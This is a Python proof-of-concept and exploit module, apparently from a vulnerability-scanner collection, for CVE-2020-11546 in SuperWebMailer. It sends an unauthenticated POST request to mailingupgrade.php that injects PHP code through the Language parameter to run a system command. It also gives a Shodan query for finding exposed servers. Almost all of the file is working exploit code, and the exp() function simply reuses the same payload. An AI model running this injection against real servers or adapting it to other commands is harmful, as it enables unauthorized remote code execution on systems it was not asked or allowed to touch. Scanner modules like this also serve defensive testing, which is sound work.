import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''SuperWebmailer Remote Code Execution''',
        "description": '''SuperWebMailer 7.21.0.01526 is susceptible to a remote code execution vulnerability in the Language parameter of mailingupgrade.php. An unauthenticated remote attacker can exploit this behavior to execute arbitrary PHP code via Code Injection.''',
        "severity": "critical",
        "references": [
            "https://github.com/Official-BlackHat13/CVE-2020-11546/", 
            "https://blog.to.com/advisory-superwebmailer-cve-2020-11546/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2020-11546"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-11546",
            "cwe-id": "CWE-94"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''title:"SuperWebMailer"'''
        },
        "tags": ["cve", "cve2020", "rce", "superwebmailer"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/mailingupgrade.php"""
        method = "POST"
        data = """step=1&Language=de{${system("ls")}}&NextBtn=Weiter+%3E"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""ajax_ccea.php""" in resp0.text and """ajax_getemailingactions.php""" in resp0.text and """ajax_getemailtemplates.php""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url